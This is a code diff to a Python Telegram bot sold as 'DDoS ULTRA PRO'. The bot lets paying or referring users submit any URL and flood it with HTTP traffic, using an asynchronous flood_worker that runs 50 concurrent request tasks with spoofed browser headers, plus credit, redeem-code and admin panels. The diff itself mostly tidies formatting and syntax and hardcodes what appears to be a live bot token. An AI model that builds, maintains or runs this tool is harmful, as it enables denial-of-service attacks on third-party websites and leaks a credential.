@@ -39,7 +39,7 @@ from datetime import datetime
 from urllib.parse import urlparse
 
 # ---------------- CONFIG ----------------
-BOT_TOKEN = "8861689167:AAEXWCCcgFDX6vtAqGP5b01Q1ChLg6XpBFI"
+BOT_TOKEN = (os.getenv("BOT_TOKEN") or "8861689167:AAEXWCCcgFDX6vtAqGP5b01Q1ChLg6XpBFI").strip()
 ADMIN_ID = 8472327599
 DB_PATH = "database.db"
 IMG_PATH = "welcome.jpg"
@@ -100,7 +100,7 @@ def create_welcome_image():
         return
     img = Image.new('RGB', (1280, 720), color=(15, 15, 20))
     draw = ImageDraw.Draw(img)
-    
+
     try:
         font_large = ImageFont.truetype("arial.ttf", 80)
         font_small = ImageFont.truetype("arial.ttf", 40)
@@ -110,22 +110,22 @@ def create_welcome_image():
 
     text = "DDoS ULTRA PRO"
     text2 = "Send a link below and crush it with heavy traffic"
-    
+
     bbox1 = draw.textbbox((0, 0), text, font=font_large)
     bbox2 = draw.textbbox((0, 0), text2, font=font_small)
-    
+
     x1 = (1280 - (bbox1[2] - bbox1[0])) / 2
     y1 = (720 - (bbox1[3] - bbox1[1])) / 2 - 60
-    
+
     x2 = (1280 - (bbox2[2] - bbox2[0])) / 2
     y2 = y1 + 100
 
     draw.text((x1, y1), text, fill=(0, 255, 150), font=font_large)
     draw.text((x2, y2), text2, fill=(200, 200, 200), font=font_small)
-    
+
     draw.rectangle([0, 700, 1280, 720], fill=(0, 255, 150))
     draw.rectangle([0, 0, 1280, 20], fill=(0, 255, 150))
-    
+
     img.save(IMG_PATH)
 
 # ---------------- DATABASE SETUP ----------------
@@ -144,7 +144,7 @@ async def init_db():
         await db.execute("""CREATE TABLE IF NOT EXISTS pending (
             id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, timestamp TEXT)""")
         await db.commit()
-        
+
         await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('maintenance', 'OFF')")
         await db.commit()
 
@@ -156,7 +156,7 @@ async def flood_worker(target_url, duration, user_id):
     if not parsed.scheme:
         target_url = "http://" + target_url
         parsed = urlparse(target_url)
-    
+
     headers_base = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -181,21 +181,21 @@ async def flood_worker(target_url, duration, user_id):
 
         tasks = [asyncio.create_task(attack()) for _ in range(50)]
         await asyncio.gather(*tasks)
-        
+
     active_attacks.pop(user_id, None)
 
 # ---------------- KEYBOARDS ----------------
 def user_menu():
-    return InlineKeyboardMarkup([
+    return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton("🚀 Launch DDoS", callback_data="ddos_prompt")],
         [InlineKeyboardButton("📊 Dashboard", callback_data="dashboard"), InlineKeyboardButton("🎁 Refer & Earn", callback_data="refer")],
         [InlineKeyboardButton("🎟️ Redeem Code", callback_data="redeem"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
         [InlineKeyboardButton("💾 Backup Data", callback_data="backup"), InlineKeyboardButton("👤 My Account", callback_data="my_account")],
-        [InlineKeyboardButton("📢 Official Channel ↗️", url=CHANNEL_LINK), InlineKeyboardButton("🧑‍💻 Contact Owner ↗️", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")]
+        [InlineKeyboardButton("📢 Official Channel ↗️", url=CHANNEL_LINK), InlineKeyboardButton("🧑‍💻 Contact Owner ↗️", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")],
     ])
 
 def admin_panel_1():
-    return InlineKeyboardMarkup([
+    return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton("🔍 DB Query", callback_data="admin_db"), InlineKeyboardButton("☁️ Cloud Backup", callback_data="admin_backup")],
         [InlineKeyboardButton("🧹 Clear Logs", callback_data="admin_clearlogs"), InlineKeyboardButton("📦 Live Logs", callback_data="admin_livelogs")],
         [InlineKeyboardButton("⚡ RAM & CPU Limits", callback_data="admin_limits"), InlineKeyboardButton("🔔 Pending Requests", callback_data="admin_pending")],
@@ -205,7 +205,7 @@ def admin_panel_1():
     ])
 
 def admin_panel_2():
-    return InlineKeyboardMarkup([
+    return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton("🤖 System Status: ON", callback_data="admin_sysstatus"), InlineKeyboardButton("🛠️ Maintenance: OFF", callback_data="admin_maint")],
         [InlineKeyboardButton("➕ Add Credit", callback_data="admin_addcredit"), InlineKeyboardButton("➖ Remove Credit", callback_data="admin_remcredit")],
         [InlineKeyboardButton("🎁 Set Referral Reward", callback_data="admin_setref"), InlineKeyboardButton("🎟️ Create Redeem Code", callback_data="admin_createredeem")],
@@ -227,7 +227,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("SELECT * FROM users WHERE user_id=?", (user.id,)) as c:
             row = await c.fetchone()
-        
+
         if not row:
             ref_id = None
             if context.args and context.args[0].startswith("ref_"):
@@ -235,7 +235,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     ref_id = int(context.args[0].split("_")[1])
                 except:
                     pass
-            
+
             await db.execute("INSERT INTO users (user_id, username, join_date) VALUES (?, ?, ?)",
                              (user.id, user.username or "None", datetime.now().strftime("%Y-%m-%d")))
             if ref_id:
@@ -249,7 +249,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "usin\n\n"
         "👇 **Select an option below to begin:**"
     )
-    
+
     if user.id == ADMIN_ID:
         await update.message.reply_photo(photo=open(IMG_PATH, 'rb'), caption=caption, parse_mode="Markdown", reply_markup=admin_panel_1())
     else:
@@ -271,7 +271,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 row = await c.fetchone()
                 prem = row[1] if row[1] else "None"
                 msg = f"📊 **Dashboard**\n\n💰 Credits: `{row[0]}`\n💎 Premium: `{prem}`\n🚀 Active Attacks: `{1 if user_id in active_attacks else 0}`"
-                kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
+                kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
                 await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)
 
     elif data == "refer":
@@ -281,7 +281,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             async with db.execute("SELECT refer_count FROM users WHERE user_id=?", (user_id,)) as c:
                 count = (await c.fetchone())[0]
         msg = f"🎁 **Refer & Earn**\n\nInvite friends and get 10 credits per join!\n\n🔗 Your Link:\n`{link}`\n\n👥 Total Referrals: `{count}`"
-        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
         await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)
 
     elif data == "redeem":
@@ -289,7 +289,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['state'] = 'awaiting_redeem'
 
     elif data == "settings":
-        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
         await query.edit_message_text("⚙️ **Settings**\n\nNo settings available right now.", reply_markup=kb)
 
     elif data == "backup":
@@ -307,7 +307,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             async with db.execute("SELECT username, credits, premium_until, join_date FROM users WHERE user_id=?", (user_id,)) as c:
                 u = await c.fetchone()
         msg = f"👤 **My Account**\n\n🆔 ID: `{user_id}`\n👤 Username: @{u[0]}\n💰 Credits: `{u[1]}`\n💎 Premium: `{u[2] if u[2] else 'None'}`\n📅 Joined: `{u[3]}`"
-        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
         await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)
 
     elif data == "back_to_menu":
@@ -320,7 +320,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "admin_panel1":
         await query.edit_message_text("👑 **Admin Panel - Page 1**", reply_markup=admin_panel_1())
-    
+
     elif data == "admin_panel2":
         await query.edit_message_text("👑 **Admin Panel - Page 2**", reply_markup=admin_panel_2())
 
@@ -384,7 +384,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "admin_addcredit":
         await query.edit_message_text("➕ Send: `user_id amount` to add credits.")
         context.user_data['state'] = 'admin_addcredit'
-    
+
     elif data == "admin_createredeem":
         await query.edit_message_text("🎟️ Send: `code amount` to create a redeem code.")
         context.user_data['state'] = 'admin_createredeem'
@@ -392,7 +392,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "admin_broadcast":
         await query.edit_message_text("📢 Send the message you want to broadcast to all users.")
         context.user_data['state'] = 'admin_broadcast'
-        
+
     else:
         await query.edit_message_text(f"✅ Action `{data}` triggered successfully.", reply_markup=admin_panel_2())
 
@@ -416,17 +416,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except:
             await update.message.reply_text("❌ Invalid number. Send a valid integer.")
             return
-        
+
         url = context.user_data['target_url']
         await update.message.reply_text(f"🚀 **Launching Attack**\n\n🎯 Target: `{url}`\n⏱️ Time: `{duration}s`\n⚡ Engine: `10M IP Ultra Pro`\n\n*Attack is running in the background...*", parse_mode="Markdown")
-        
+
         active_attacks[user_id] = True
         asyncio.create_task(flood_worker(url, duration, user_id))
-        
+
         async with aiosqlite.connect(DB_PATH) as db:
             await db.execute("INSERT INTO logs (user_id, action, timestamp) VALUES (?, ?, ?)", (user_id, f"DDoS: {url} for {duration}s", datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
             await db.commit()
-            
+
         context.user_data['state'] = None
 
     elif state == 'awaiting_redeem':
@@ -482,10 +482,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---------------- MAIN ----------------
 def main():
     logging.basicConfig(level=logging.INFO)
-    
+
     # Generate image if it doesn't exist
     create_welcome_image()
-    
+
     # Initialize database
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
